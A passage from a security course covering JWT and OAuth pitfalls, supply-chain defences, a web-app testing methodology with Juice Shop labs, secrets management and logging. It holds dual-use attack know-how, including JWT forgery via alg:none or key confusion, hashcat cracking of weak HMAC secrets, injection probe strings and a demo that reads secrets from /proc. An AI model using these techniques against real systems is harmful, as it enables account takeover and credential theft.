   (RS256->HS256)      PUBLIC key as an HMAC secret -> attacker forges
                      tokens using the public key. Pin alg; use separate
                      verify APIs.
   weak HMAC secret -> brute-forced offline (jwt_tool, hashcat). Use a
                      long random secret / proper keys.
   no exp / long exp / no aud / no iss checks -> replay, token reuse
                      across services. Validate exp, nbf, iss, aud, sub.
   kid injection    -> path traversal / SQLi via the key-id header.
   storing in localStorage -> XSS reads it. Prefer a cookie with the
                      flags above; if you must use headers, keep tokens
                      short-lived.
   can't revoke      -> keep them short; maintain a denylist / token
                      version / "tokens issued before T are invalid".
```

### Passwords and MFA (building on Ch 10)

```
   - Argon2id storage (Ch 10). Screen against Have I Been Pwned. No
     forced composition or rotation (NIST SP 800-63B).
   - Rate-limit + lockout-with-care (per-account and per-IP; avoid
     enabling DoS-by-lockout; use exponential backoff + CAPTCHA-as-late-
     resort + device signals).
   - Uniform responses/timing for "no such user" vs "wrong password"
     (anti-enumeration, Ch 10).
   - MFA tiers, weakest to strongest:
       SMS OTP        -> phishable, SIM-swappable. Better than nothing.
       TOTP (authenticator app) -> phishable (real-time relay) but no
                                   SIM-swap. Good baseline.
       Push w/ number-matching -> resists MFA fatigue.
       WebAuthn / PASSKEYS (FIDO2) -> PHISHING-RESISTANT: the credential
                                   is bound to the origin, cryptographic
                                   challenge-response, private key in a
                                   TPM/secure enclave/security key.
                                   THE target to move users toward.
   - Account recovery is the real backdoor. "Reset via email" makes email
     the true root of trust. Recovery must be as strong as primary auth
     (or explicitly, deliberately weaker with monitoring).
```

### OAuth 2.0 and OIDC — the 90-second model

```
   OAuth 2.0 = DELEGATED AUTHORIZATION ("let this app access my
     Google Calendar"). It is NOT an authentication protocol.
   OIDC (OpenID Connect) = an identity layer ON TOP of OAuth 2.0
     ("log in with Google") -- adds the ID TOKEN (a JWT about the user)
     and a /userinfo endpoint.

   ROLES:  Resource Owner (user) | Client (your app) |
           Authorization Server (Google/Okta) | Resource Server (the API)

   USE THE AUTHORIZATION CODE FLOW + PKCE, always (SPAs and mobile
   included). The old Implicit and Password (ROPC) grants are deprecated.

     1. app redirects user to the Authorization Server with:
          response_type=code, client_id, redirect_uri, scope,
          state=<random, CSRF>, code_challenge=<S256(verifier)>
     2. user authenticates + consents there
     3. AS redirects back: ?code=...&state=...
        app checks state matches.
     4. app -> AS /token  (back-channel): code + code_verifier + client
        creds  -> access_token (+ id_token for OIDC, + refresh_token)
     5. app calls the API with  Authorization: Bearer <access_token>
```

**OAuth/OIDC mistakes that cause account takeover:**

```
   - Not validating `state` -> CSRF on the callback / code injection.
   - Loose redirect_uri matching (prefix/substring/open-redirect on the
     client) -> code/token exfiltration. Require EXACT registered URIs.
   - No PKCE -> authorization-code interception (esp. mobile/SPA).
   - Accepting an id_token without verifying signature, iss, aud, exp,
     nonce.
   - Using the ACCESS token as proof of identity (it's for the API, may be
     opaque, has no audience for your app) -> use the ID token / userinfo.
   - "Confused deputy": trusting an id_token minted for a DIFFERENT client
     (check `aud`).
   - Mixing up auth/authz: OIDC tells you WHO; your app still decides
     WHAT they can do (Ch 45).
   - Long-lived tokens in the browser; refresh tokens without rotation +
     reuse detection.
```

### Practice (45 min) — lab only

```
   1. Session fixation: in a lab app, capture your pre-login session ID,
      log in, check whether it CHANGED. If not, that's the bug -- fix by
      regenerating on login.
   2. JWT:
      - Decode a lab JWT on jwt.io. Flip a claim, re-encode with alg:none
        or with 'HS256' + the RS256 public key. Try it against the app
        (Juice Shop has a JWT challenge).
      - Fix a local verifier: pin alg, verify aud/iss/exp, reject none.
      - Crack a weak-secret HS256 token with `jwt_tool` / hashcat -m 16500
        against a wordlist (your token only).
   3. OAuth: run a local OIDC provider (Keycloak / Dex / `oauth2-proxy`
      with a test IdP). Implement the auth-code + PKCE flow in ~50 lines.
      Then break it: skip `state` and show the callback is now CSRF-able;
      loosen `redirect_uri` matching and show code theft via an open
      redirect.
   4. Add WebAuthn to a toy login (SimpleWebAuthn library). Register a
      passkey (platform authenticator or a security key) and log in with
      it. Note there is no shared secret to phish.
```

### Common confusions

- **"JWT = secure sessions."** JWTs trade revocability and simplicity for
  scale, and carry a list of well-known footguns. For a single app, opaque
  server-side sessions are simpler and safer.
- **"OAuth logs users in."** OAuth authorizes access to resources. **OIDC** does
  login. Using bare OAuth for login (and trusting the access token as identity)
  causes real account-takeover bugs.
- **"PKCE is only for mobile."** Current guidance: PKCE for **all** clients,
  including server-side and SPA.
- **"MFA stops phishing."** SMS/TOTP/push are relay-phishable. Only
  WebAuthn/passkeys are phishing-resistant (origin-bound).
- **"Lock the account after N failures."** Naive lockout is a DoS vector (lock
  everyone out by trying their emails). Use backoff, IP/device signals, and
  targeted friction.
- **"Store the JWT in localStorage for SPAs."** Then any XSS exfiltrates it.
  Cookie + `HttpOnly` + `SameSite` + short lifetime is usually better.

### Check yourself

1. Stateful sessions vs stateless JWTs — one advantage and one drawback of each.
2. What is session fixation and the one-line fix?
3. Name three JWT footguns and the mitigation for each.
4. OAuth 2.0 vs OIDC — which authenticates the user? Which flow should you use,
   and what does PKCE prevent?
5. Why is WebAuthn "phishing-resistant" when TOTP is not?
6. Why is account recovery often the weakest link, and what's the standard for
   it?

### Further reading

- **Standard:** NIST SP 800-63B (authentication) — sections 5 (authenticators)
  and 7 (session management).
- **Spec/guidance:** OAuth 2.0 Security Best Current Practice (RFC 9700), OAuth
  2.1 draft, and `oauth.net` diagrams. `openid.net` for OIDC.
- **Cheat sheets:** OWASP "Authentication", "Session Management", "JSON Web
  Token for Java" (concepts apply broadly), "Credential Stuffing Prevention".
- **Site:** `webauthn.guide` and `passkeys.dev` — clear WebAuthn/passkey
  explainers. `jwt.io` for decoding.
- **Course:** PortSwigger Academy — "Authentication", "JWT attacks", "OAuth 2.0
  authentication vulnerabilities" tracks.
- **Tool:** `jwt_tool` (`github.com/ticarpi/jwt_tool`) — JWT attack toolkit, lab
  use.

---

## Chapter 47 — Supply chain and the code you didn't write

### In one sentence

Most of your application is third-party code — dependencies, base images, build
tools, CI plugins, CDNs — and each is a path into production that you must
inventory, pin, verify, and monitor.

### The attack surface

```
   DIRECT DEPENDENCIES        the 20 packages you chose
   TRANSITIVE DEPENDENCIES    the 800 they pulled in (this is where it hides)
   BUILD-TIME                 compilers, bundlers, codegen, CI plugins,
                              GitHub Actions, pre/post-install scripts
   BASE IMAGES                FROM node:20 -> a whole OS you didn't audit
   DEV TOOLS                  IDE extensions, linters, test frameworks
   RUNTIME PULLS              CDN <script>, fonts, analytics, tag managers
   INFRASTRUCTURE             Terraform modules, Helm charts, Ansible roles
```

### How supply-chain attacks actually happen

```
   TYPOSQUATTING / name confusion  reqeusts, python-dateutil vs
     python3-dateutil, lodahs. Install-time scripts run as you.
   DEPENDENCY CONFUSION  publish a PUBLIC package with the same name as a
     company's PRIVATE one + higher version -> the resolver picks the
     public one (Alex Birsan, 2021 -- hit Apple, Microsoft, dozens more).
   COMPROMISED MAINTAINER  stolen npm/PyPI creds, or a maintainer goes
     rogue (event-stream 2018; ua-parser-js 2021; a burnt-out maintainer
     hands over the keys).
   MALICIOUS UPDATE to a legit package  (xz-utils / liblzma backdoor,
     2024 -- a multi-year social-engineering campaign to plant an sshd
     backdoor; caught by luck).
   BUILD SYSTEM COMPROMISE  SolarWinds (2020) -- malware injected into the
     build, so the SIGNED official artifact was backdoored.
   CI/CD  leaked tokens, `pull_request_target` misuse, poisoned caches,
     self-hosted runner takeover, a malicious Action pinned to a mutable tag.
   PROTESTWARE  a maintainer ships sabotage (node-ipc, 2022).
```

### The defences (SLSA-style, layered)

```
   INVENTORY
   [ ] Generate an SBOM (CycloneDX / SPDX) per build. Know every component
       and version in prod.  (syft, cdxgen, `npm sbom`, trivy)

   PIN & LOCK
   [ ] Commit lockfiles (package-lock.json, poetry.lock, go.sum, Cargo.lock).
   [ ] Pin GitHub Actions to a full commit SHA, not @v3 (mutable tag).
   [ ] Pin base images by DIGEST (FROM node:20@sha256:...), not tag.
   [ ] Disable/participate cautiously in install scripts
       (npm --ignore-scripts where feasible; vet the exceptions).

   VERIFY
   [ ] Signature/provenance verification: npm provenance, PyPI Trusted
       Publishing + attestations, Sigstore/cosign for containers, SLSA
       provenance, `cargo-vet`/`cargo-crev`.
   [ ] Checksum-pin where signatures aren't available.
   [ ] Use a PRIVATE REGISTRY / pull-through proxy (Artifactory, GAR,
       Verdaccio) with an allowlist; block direct public pulls from prod
       builds. Scope internal names to defeat dependency confusion
       (npm scopes, explicit index-url, no implicit fallback).

   SCAN & MONITOR
   [ ] SCA in CI: Dependabot/Renovate, `npm audit`, `pip-audit`,
       `osv-scanner`, Trivy, Snyk/Grype -> fail the build on known-critical
       CVEs (with a triage/allowlist process so it's not ignored).
   [ ] Watch advisories: GitHub Advisory DB, OSV, your ecosystem's feeds.
   [ ] Renovate/Dependabot for timely, reviewed updates (stale deps are
       the more common real problem than malicious ones).

   CONTAIN
   [ ] Least privilege for CI: short-lived OIDC creds, no long-lived
       secrets, minimal token scopes, protected branches, required
       reviews, environment protection rules.
   [ ] Reproducible / hermetic builds where you can (SLSA L3+).
   [ ] Runtime: minimal/distroless images, non-root, read-only FS,
       egress filtering (a backdoored dep still has to call home).
   [ ] Subresource Integrity (SRI) for any CDN <script>/<link>, or better,
       self-host.

   DATA & CODE INTEGRITY (OWASP A08)
   [ ] Signed releases (Ch 22/26 tool). Verify before deploy.
   [ ] No insecure deserialization of untrusted data (pickle, Java
       ObjectInputStream, PHP unserialize, YAML unsafe_load, .NET
       BinaryFormatter) -> RCE. Use JSON / schema-validated formats.
   [ ] Protect the update channel: signed, versioned, rollback-safe (TUF).
```

### Practice (40 min)

```bash
# 1. See how deep the tree really goes
npm ls --all 2>/dev/null | wc -l          # or: npm ls --all --json | jq '..|.dependencies?|keys?' 
pipdeptree 2>/dev/null | wc -l
go list -m all | wc -l

# 2. Generate an SBOM and scan it
syft dir:. -o cyclonedx-json > sbom.json    # or: trivy fs --format cyclonedx -o sbom.json .
grype sbom:sbom.json                        # or: osv-scanner --sbom sbom.json
trivy fs --scanners vuln,secret,misconfig .

# 3. Audit with the ecosystem tools
npm audit --audit-level=high
pip-audit -r requirements.txt
osv-scanner -r .
cargo audit          # if Rust

# 4. Find unpinned CI and images (your repos)
grep -rnE 'uses: .*@(v?[0-9]+|main|master)$' .github/workflows/    # mutable Action refs
grep -rn 'FROM .*:[^@]*$' Dockerfile*                              # tag, not digest

# 5. Dependency-confusion check: do you have internal package names that
#    are NOT scoped / could be resolved from the public registry?
cat package.json | jq '.dependencies|keys[]' | grep -v '^"@'       # unscoped deps

# 6. SRI for a CDN script:
#   printf '' | openssl dgst -sha384 -binary < jquery.min.js | openssl base64 -A
#   <script src="..." integrity="sha384-..." crossorigin="anonymous"></script>
```

### Mini-project (60 min): supply-chain gate for SecureShop

```
   Add to SecureShop's CI a "supply-chain gate" stage that:
     1. Builds an SBOM (syft) and stores it as an artifact per release.
     2. Runs osv-scanner + trivy; FAILS on CRITICAL/HIGH with no
        documented, time-boxed exception file (.security/allow.yml with
        reason + expiry + owner).
     3. Verifies all GitHub Actions are pinned to SHAs (a lint step).
     4. Verifies the base image is pinned by digest.
     5. Signs the built container with cosign and generates SLSA
        provenance; the deploy step verifies the signature before rollout.
     6. Emits a short report to ~/sec-lab/reports/part10-supplychain.md:
        dependency count (direct/transitive), findings, exceptions,
        what the gate blocked.
```

### Common confusions

- **"`npm audit` is noise."** Much of it is low-severity transitive stuff — but
  triage it with a process (allowlist + expiry), don't blanket-ignore. The one
  real RCE will be in there too.
- **"Lockfile = safe."** Lockfiles pin versions (integrity), which is essential,
  but a pinned version can still be malicious (compromised release). Add
  signature/provenance verification and scanning.
- **"We only use big, popular packages."** `event-stream`, `ua-parser-js`,
  `xz-utils`, and `left-pad` were all popular. Popularity is not safety;
  maintenance health and provenance are.
- **"Our code is signed, so the pipeline is secure."** SolarWinds signed the
  backdoored artifact. Protect the *build*, not just the *release step*.
- **"Pinning Actions to @v3 is pinning."** Tags are mutable. Pin to the commit
  SHA.
- **"SCA covers us."** SCA finds *known* CVEs. It won't catch a fresh malicious
  package or a novel backdoor. Layers: inventory + pin + verify + scan +
  contain.

### Check yourself

1. Where in the dependency tree does most hidden risk live, and why?
2. Explain dependency confusion and one way to prevent it.
3. What is an SBOM and why generate one per build?
4. Why pin GitHub Actions and base images by digest/SHA rather than tag?
5. What did SolarWinds teach that "sign your releases" alone doesn't cover?
6. Name a deserialization function in a language you use that can lead to RCE,
   and the safe alternative.

### Further reading

- **Framework:** SLSA (`slsa.dev`) — supply-chain integrity levels; start with
  the "get started" and the threats page.
- **Project:** Sigstore / cosign (`sigstore.dev`); OSV and `osv-scanner`
  (`osv.dev`); Syft/Grype (Anchore); Trivy (Aqua).
- **Guidance:** OWASP "Software Supply Chain Security" and the CNCF "Software
  Supply Chain Best Practices" paper; SP 800-204D; CISA/NSA "Securing the
  Software Supply Chain" series.
- **Write-ups:** Alex Birsan, "Dependency Confusion" (2021); the `xz-utils`
  backdoor analyses (Andres Freund's disclosure + timelines); the SolarWinds
  SUNBURST technical reports.
- **Cheat sheet:** OWASP "Vulnerable Dependency Management" and "Deserialization".

---

## Chapter 48 — Hands-on: testing a web application

### Why this chapter exists

You've seen the bug classes; this is the workflow for finding them in a running
app — legally, in your lab — and the tools that make it efficient.

### The toolkit

```
   INTERCEPTING PROXY    Burp Suite (Community is fine to start) or
                         OWASP ZAP. Sits between browser and app; you
                         inspect, modify, and replay every request.
                         -> the single most important tool. Learn one well.

   BROWSER DEVTOOLS      Network tab (see every request, copy as curl),
                         Application tab (cookies, storage, SW),
                         Console (SOP/CSP errors, quick DOM XSS checks),
                         Debugger (find DOM-XSS sinks).

   RECON                 subfinder/amass (subdomains -- your scope only),
                         httpx (probe alive), katana/gau (crawl/URLs),
                         nuclei (templated checks), ffuf/feroxbuster
                         (content & param discovery).

   TARGETED              sqlmap (SQLi), jwt_tool (JWT), dalfox/XSStrike
                         (XSS), ssrf tooling, Param Miner (Burp ext).

   PASSIVE/SANITY        securityheaders.com, Mozilla Observatory,
                         testssl.sh (Part 7), retire.js / SCA (Ch 47).

   PRACTICE TARGETS      OWASP Juice Shop, PortSwigger Web Security
                         Academy, DVWA, WebGoat, HackTheBox, bug-bounty
                         programs WITH scope. (Chapter 0.6.)
```

### A repeatable methodology

```
   1. MAP
      - Crawl with the proxy running (browse every feature as a normal
        user). Build the site map: endpoints, params, roles, formats.
      - Note tech stack (headers, cookies, JS bundles, errors, favicon).
      - Identify trust boundaries and where user input reaches a
        parser/interpreter/filesystem/sub-request.

   2. AUTH & SESSION
      - How are you identified? Cookie flags. Session rotation on login.
      - JWT? decode it, check alg/exp/aud. OAuth? check state/PKCE/
        redirect_uri.
      - Logout actually invalidates? Password reset flow. Enumeration on
        login/reset/register (timing + messages).

   3. ACCESS CONTROL  (highest ROI -- OWASP #1)
      - Make TWO accounts (A, B). For every object/endpoint A can use,
        replay it AS B and AS anonymous. Change IDs. (Burp: "Autorize" or
        "AuthMatrix" extension automates this.)
      - Find admin/internal endpoints from JS; call them as a low user.
      - Mass assignment: add role/isAdmin/owner fields to update bodies.

   4. INPUT HANDLING
      - For each parameter: try ' " ` \ ; and observe. SQLi (errors,
        timing), XSS (reflection context), command injection, SSTI
        ({{7*7}}), path traversal (../), SSRF (URL params -> your
        collaborator/OAST endpoint).
      - Test JSON/XML/multipart variants; content-type confusion; HTTP
        method override; parameter pollution.

   5. CLIENT-SIDE
      - CSP present and strict? DOM XSS sinks in the JS? postMessage
        handlers without origin checks? CORS policy (reflected origin?
        credentials?). Clickjacking (frame-ancestors).

   6. BUSINESS LOGIC
      - Negative quantities, price/total tampering, coupon stacking,
        race conditions (parallel requests -> double-spend), skipping
        steps in a flow, replaying one-time tokens.

   7. INFRA / MISC
      - Verbose errors, stack traces, debug endpoints (/actuator, /debug,
        .git/, .env, backup files), default creds, directory listing,
        outdated components (retire.js/SCA), security headers.

   8. REPORT
      - Per finding: title, severity (CVSS + business impact), affected
        endpoint, reproduction steps, request/response evidence, root
        cause, remediation, references. Retest after the fix.
```

### Practice / capstone lab for Part 10 (2-3 hours)

```
   Target: OWASP Juice Shop, run locally (docker run -p 3000:3000
   bkimminich/juice-shop). Proxy through Burp/ZAP.

   Find and DOCUMENT one finding in each class:
     [ ] Injection (SQLi login bypass or UNION data extraction)
     [ ] XSS (one of reflected / stored / DOM)
     [ ] Broken access control (basket/order IDOR, or an admin API)
     [ ] Authentication/JWT (forge or tamper a token)
     [ ] CSRF or SSRF or CORS misconfig
     [ ] Security misconfiguration (a header, an exposed file, verbose
         error) or a vulnerable component (retire.js)

   For each: write a mini report (the "REPORT" template above) into
   ~/sec-lab/reports/part10-webapp.md.

   Then pick TWO findings and build the FIX in a small local app:
   reproduce the bug, apply the remediation from the relevant chapter,
   write a test that proves it's closed.
```

### Common confusions

- **"Scanners find the bugs."** Automated scanners find *some* — misconfig,
  known CVEs, reflected XSS, obvious SQLi. Access control and business logic —
  the highest-impact classes — need a human with two accounts and a proxy.
- **"Burp Community is too limited."** It's enough to learn the entire
  methodology above. Repeater, Intruder (rate-limited), Decoder, and the proxy
  cover most of it.
- **"Testing = running nuclei."** Templates are great for breadth/regression.
  They don't understand your app's authorization model or workflows.
- **"I found it, I'm done."** A finding without clear reproduction steps, impact,
  and a remediation is low value. And always retest the fix.
- **"It's my company's app, I can test prod."** You need written authorization
  and a defined scope/window even internally (Chapter 0.6). Test staging;
  coordinate.

### Check yourself

1. What is an intercepting proxy and why is it the core tool?
2. Which vulnerability class gives the highest ROI when testing, and what's the
   basic technique (hint: two accounts)?
3. Give the first-pass input characters you'd try on a parameter, and what each
   might reveal.
4. Name three "infra/misc" issues you'd check with almost no effort.
5. What must every finding in a report contain?

### Further reading

- **Course (do this):** PortSwigger Web Security Academy — free, comprehensive,
  labs for every topic in this Part. The single best resource.
- **Book:** *The Web Application Hacker's Handbook* (2nd ed.) for methodology;
  *Real-World Bug Hunting*, Peter Yaworski, for worked examples.
- **Standard:** OWASP Web Security Testing Guide (WSTG) — the exhaustive
  checklist version of this chapter.
- **Tools:** Burp Suite docs / "Burp Suite Certified Practitioner" path; OWASP
  ZAP getting-started; `nuclei`, `ffuf`, `sqlmap` docs.
- **Practice:** OWASP Juice Shop companion book (`pwning.owasp-juice.shop`, free);
  HackTheBox / TryHackMe web paths.

---

### End of Part 10 — Milestone check

- [ ] I can define an origin and explain the same-origin policy precisely
- [ ] I know the cookie flags to set on every session cookie, and why
- [ ] I can explain why CORS is not authorization
- [ ] **I have exploited and then FIXED a SQL injection with parameterisation**
- [ ] I can explain context-aware output encoding and a strict CSP
- [ ] **I have exploited and fixed an IDOR by scoping the query to the owner**
- [ ] I can explain CSRF, SSRF, and clickjacking and the defence for each
- [ ] I know the JWT footguns and the OAuth/OIDC auth-code-plus-PKCE flow
- [ ] I can generate an SBOM and explain dependency confusion
- [ ] **I completed the Juice Shop capstone: one finding per bug class,
      documented, plus two real fixes with tests**
- [ ] I wrote the Part 10 web-app and supply-chain reports

---

# Part 11 — Operating securely

Building secure software is half the job. The other half is running it: keeping
secrets out of reach, seeing what's happening, responding when something goes
wrong, and designing so the inevitable failures are contained.

## Chapter 49 — Secrets management

### In one sentence

A secret is any value that grants access — passwords, API keys, tokens, private
keys, DB connection strings — and the goal is that they are never in source, never
in an image, short-lived, access-controlled, audited, and fast to rotate.

### Where secrets leak (in rough order of how often it actually happens)

```
   1. SOURCE CONTROL      hard-coded in code, committed .env, a config file
                          with real values, a test fixture. Git keeps
                          history forever -- a deleted secret is still in
                          the log, in forks, in clones, on CI caches.
   2. CI/CD LOGS          `echo $API_KEY` for debugging; a tool that prints
                          its config; a stack trace with a connection string.
   3. CONTAINER IMAGES    ARG/ENV secrets baked into a layer; a COPY of the
                          whole repo including .env; `docker history` shows
                          build args.
   4. CLIENT-SIDE         API keys in a mobile app binary or SPA bundle
                          ("it's obfuscated" -- it's `strings` away).
   5. LOGS & APM          request bodies, headers (Authorization), query
                          strings with tokens, error objects.
   6. THIRD PARTIES       Slack messages, Jira tickets, screenshots, wikis,
                          a paste in a support chat.
   7. BACKUPS & SNAPSHOTS a DB dump or VM snapshot with secrets in a table
                          or on disk, stored less carefully than prod.
   8. ENV VARS            readable via /proc, crash dumps, subprocess
                          inheritance, some PaaS dashboards, `ps e`.
```

### The hierarchy of "less bad"

```
   WORST   hard-coded in source
     |     plaintext config file next to the code
     |     environment variable (better: at least not in git -- but see above)
     |     encrypted-at-rest file, decrypted at deploy (SOPS, git-crypt,
     |         sealed-secrets) -- key management just moved, not solved
     |     a SECRETS MANAGER: Vault, AWS/GCP/Azure Secret Manager,
     |         Kubernetes Secrets + a CSI driver, Doppler, Infisical
   BEST    DYNAMIC, SHORT-LIVED credentials minted per-workload on demand
             (Vault dynamic DB creds, cloud IAM roles / workload identity,
              SPIFFE SVIDs, OIDC-federated CI with no stored secret at all)
```

The end state to aim for: **the application authenticates with a workload
identity it didn't have to be given** (instance role, K8s ServiceAccount token,
OIDC), and exchanges it for short-lived, scoped, audited credentials.

### A secrets manager: what it buys you

```
   * central store, encrypted at rest, TLS in transit
   * fine-grained access policy (this service reads THIS path only)
   * full audit log (who read what, when)
   * versioning + rollback
   * DYNAMIC secrets: Vault creates a DB user with a 1-hour TTL when the
     app asks, and deletes it after -> a leaked cred is useless in an hour
   * automatic ROTATION (static secrets rotated on a schedule / on demand)
   * leasing + revocation: kill all credentials issued to a compromised
     service in one command
```

### Rotation

```
   Every static secret needs: an owner, an expiry, and a tested rotation
   runbook. If you can't rotate a key in under an hour without an outage,
   that's an incident waiting to happen.

   PATTERN for zero-downtime rotation (works for API keys, signing keys,
   HMAC secrets, DB creds):
     1. Create the NEW secret alongside the old (both valid).
     2. Deploy consumers to ACCEPT both (verify against old OR new).
     3. Deploy producers to USE the new.
     4. Confirm no traffic uses the old (metrics/logs).
     5. Revoke the old.
   Keep 2 key versions live at all times -> rotation is routine, not scary.
```

### Detecting leaked secrets

```
   PRE-COMMIT / PRE-PUSH   gitleaks, trufflehog, detect-secrets as a git
                           hook -> stop it before it's committed.
   CI SCAN                 same tools on every PR + full-history scan
                           periodically (secrets predate the policy).
   PLATFORM                GitHub/GitLab secret scanning + push protection;
                           partner alerts (many providers auto-revoke on a
                           public leak -- e.g. AWS, Stripe, GitHub tokens).
   MONITORING              alert on use of a secret from an unexpected IP/
                           ASN/time; canary tokens (a fake AWS key that
                           pages you the instant anyone uses it --
                           canarytokens.org).
   IF ONE LEAKS: assume compromised. ROTATE first, investigate second.
   Removing the commit is NOT remediation -- the value must be invalidated.
```

### Practice (40 min)

```bash
cd ~/sec-lab/scratch

# 1. Scan a repo (yours) for secrets, including history
docker run --rm -v "$PWD":/repo zricethezav/gitleaks:latest detect \
   --source=/repo --report-format=json --report-path=/repo/gitleaks.json -v
# or: pipx run trufflehog git file://$PWD --only-verified

# 2. Add push protection locally
pipx install detect-secrets
detect-secrets scan > .secrets.baseline
cat > .git/hooks/pre-commit <<'EOF'
#!/bin/sh
detect-secrets-hook --baseline .secrets.baseline $(git diff --cached --name-only) || {
  echo "Potential secret detected. Aborting commit."; exit 1; }
EOF
chmod +x .git/hooks/pre-commit
echo 'aws_secret_access_key = "AKIA................"' > leaky.txt
git add leaky.txt && git commit -m test        # should be BLOCKED

# 3. Run Vault in dev mode and issue a DYNAMIC, short-lived secret
docker run --rm -d --name vault -p 8200:8200 -e VAULT_DEV_ROOT_TOKEN_ID=root hashicorp/vault
export VAULT_ADDR=http://127.0.0.1:8200 VAULT_TOKEN=root
vault secrets enable -path=secret kv-v2
vault kv put secret/secureshop/db username=app password="$(openssl rand -hex 16)"
vault kv get secret/secureshop/db
vault policy write app - <<'EOF'
path "secret/data/secureshop/*" { capabilities = ["read"] }
EOF
vault token create -policy=app -ttl=15m           # scoped, expiring token
# (Full dynamic-DB-creds demo: enable the `database` secrets engine against
#  a throwaway postgres, then `vault read database/creds/app-role` -> a
#  brand-new DB user that self-destructs.)
docker rm -f vault

# 4. Prove env vars leak
KEY=supersecret sh -c 'cat /proc/self/environ | tr "\0" "\n" | grep KEY'   # Linux
KEY=supersecret sh -c 'ps ew $$ | grep -o KEY=supersecret'
```

### Mini-project (45 min): SecureShop secrets baseline

```
   1. Add gitleaks + detect-secrets to CI; add push protection; run a
      full-history scan and triage/rotate anything found.
   2. Move all SecureShop secrets (DB creds, JWT signing key, third-party
      API keys) into a secrets manager (Vault dev, or your cloud's).
      App reads them at startup via a workload identity, not a committed
      file.
   3. Write and TEST a rotation runbook for the JWT signing key using the
      2-versions-live pattern (verifier accepts old+new; issuer switches;
      retire old). Time yourself -- target < 1 hour.
   4. Drop a canary AWS key (canarytokens.org) into an old-looking
      config path; document what happens if it's "used".
   5. Report -> ~/sec-lab/reports/part11-secrets.md.
```

### Common confusions

- **"It's in an env var, not the code, so it's fine."** Env vars leak via
  `/proc`, crash dumps, child processes, PaaS UIs, and logs. Better than
  hard-coding; not "safe".
- **"I deleted the commit."** The value is still in history/forks/clones/CI
  caches and possibly already scraped. Rotate. Then clean history.
- **"The mobile app key is obfuscated."** Anything shipped to the client is
  extractable. Client secrets should be per-user tokens with least privilege,
  proxied through your backend where possible.
- **"We rotate annually."** Rotation you don't practise doesn't work. Rotate
  routinely with 2 versions live so it's a non-event.
- **"Kubernetes Secrets are encrypted."** By default they're only base64-encoded
  in etcd. Enable encryption-at-rest (KMS provider) and RBAC, or use an external
  manager via the Secrets Store CSI driver.

### Check yourself

1. List four places secrets leak that aren't "hard-coded in code".
2. Order these best→worst: env var, Vault dynamic cred, hard-coded, encrypted
   file at rest.
3. What is a dynamic secret and why does it limit blast radius?
4. Describe the 2-versions-live rotation pattern.
5. A secret leaked to a public repo. First action?

*(Answers: Appendix F.)*

### Further reading

- **Docs:** HashiCorp Vault "Get Started" + the dynamic-secrets and database
  secrets-engine tutorials; your cloud's Secret Manager + workload-identity docs.
- **Cheat sheet:** OWASP "Secrets Management Cheat Sheet".
- **Tools:** `gitleaks`, `trufflehog`, `detect-secrets`, GitHub push protection
  docs, `canarytokens.org`, Mozilla SOPS, Bitnami Sealed Secrets.
- **Guidance:** "Secret Management" chapter of the Google SRE book; the
  12-Factor "Config" factor (and its limits).

---

## Chapter 50 — Logging, detection, and monitoring

### In one sentence

You cannot respond to what you cannot see: log the security-relevant events, in a
tamper-resistant central place, with enough context to answer "what happened", and
alert on the handful of things that mean "someone is attacking us".

### What to log (security events)

```
   AUTHENTICATION   login success/failure (+ method, MFA used), logout,
                    password/'MFA change, token issue/refresh/revoke,
                    session creation, step-up auth. Include: user id,
                    source IP, user-agent, geo (derived), timestamp (UTC,
                    ISO 8601), request id.
   AUTHORIZATION    access-control DENIALS (esp.), privilege changes,
                    role/permission grants, admin actions, impersonation.
   INPUT VALIDATION rejections that look like attacks (SQLi/XSS patterns,
                    path traversal), WAF blocks.
   ACCOUNT LIFECYCLE creation, deletion, lockout, recovery, email/phone
                    change.
   DATA ACCESS       reads/exports of sensitive records (who, which, how
                    many), bulk operations, report generation.
   CONFIG / DEPLOY   feature-flag flips, config changes, deploys, IAM/
                    firewall/DNS changes, new API keys.
   INTEGRITY         signature verification failures, checksum mismatches,
                    unexpected file changes (FIM).
   SYSTEM            process start/stop, new listening ports, new cron,
                    outbound connections to new destinations, container
                    escapes/priv-esc signals.
```

### What NOT to log

```
   * passwords, session tokens, API keys, full JWTs, MFA codes/secrets
   * full card numbers (PCI), CVV EVER, raw SSNs / national IDs
   * full request/response bodies on sensitive endpoints
   * more personal data than you need (GDPR data-minimisation; logs are
     a data store with retention obligations and breach exposure)
   -> REDACT at the logging boundary (allowlist fields, hash identifiers
      where you only need correlation, mask PANs to first6+last4).
   -> and beware LOG INJECTION (Ch 42): encode newlines/control chars so
      an attacker can't forge log lines or break your parser.
```

### The pipeline

```
   app / host / network / cloud
        | structured logs (JSON), one event per line, stable schema
        v
   SHIP        Fluent Bit / Vector / journald+rsyslog / cloud agent
        | over TLS, buffered, with backpressure
        v
   CENTRAL STORE (append-only, access-controlled, time-synced via NTP)
        Elastic/OpenSearch, Loki, Splunk, cloud-native (CloudWatch,
        Cloud Logging), or a data lake + query engine
        |
        +--> SIEM / detections: correlation rules, threshold alerts,
        |      anomaly detection, threat-intel matching
        |      (Elastic Security, Splunk ES, Sentinel, Panther, Wazuh,
        |       Sigma rules as portable detection-as-code)
        +--> DASHBOARDS + scheduled reports
        +--> long-term cold storage for the retention window
```

Key properties: **central** (an attacker on one host can't erase the evidence),
**append-only / integrity-protected** (WORM storage, or hash-chained), **time-
synced** (correlation across systems needs trustworthy timestamps), **retained**
long enough (dwell time is often *months* — 90 days is a floor, 1 year better).

### Alerting: signal, not noise

```
   Alert on things that are ACTIONABLE and mean "attack in progress":
     - impossible travel / login from new country + MFA reset
     - spike in 401/403 from one source (enumeration / cred stuffing)
     - a single account hitting many object IDs (IDOR probing)
     - auth success after many failures (brute force succeeded)
     - admin action outside change windows / by a dormant account
     - outbound traffic to a new IP from a prod box (C2 / exfil)
     - your canary token used (Ch 49)
     - signature/integrity verification failure in the deploy path
     - disabling of logging/security tooling

   Every alert needs a RUNBOOK (what to check, how to triage, when to
   escalate). An alert with no runbook gets muted, then ignored.
   Tune ruthlessly: a channel that's 95% false positives is blind.
```

### Detection engineering basics

```
   * Map detections to MITRE ATT&CK techniques -> know your coverage gaps.
   * Detection-as-code: rules in git, peer-reviewed, tested against
     recorded attack data, CI-linted (Sigma, Elastic detection rules).
   * Purple-team: run a known technique (Atomic Red Team, Caldera) ->
     did it fire? tune -> repeat.
   * Track metrics: MTTD (mean time to detect), MTTR (respond),
     alert precision, ATT&CK coverage.
```

### Practice (40 min)

```bash
# 1. Structured security logging in a tiny app (concept)
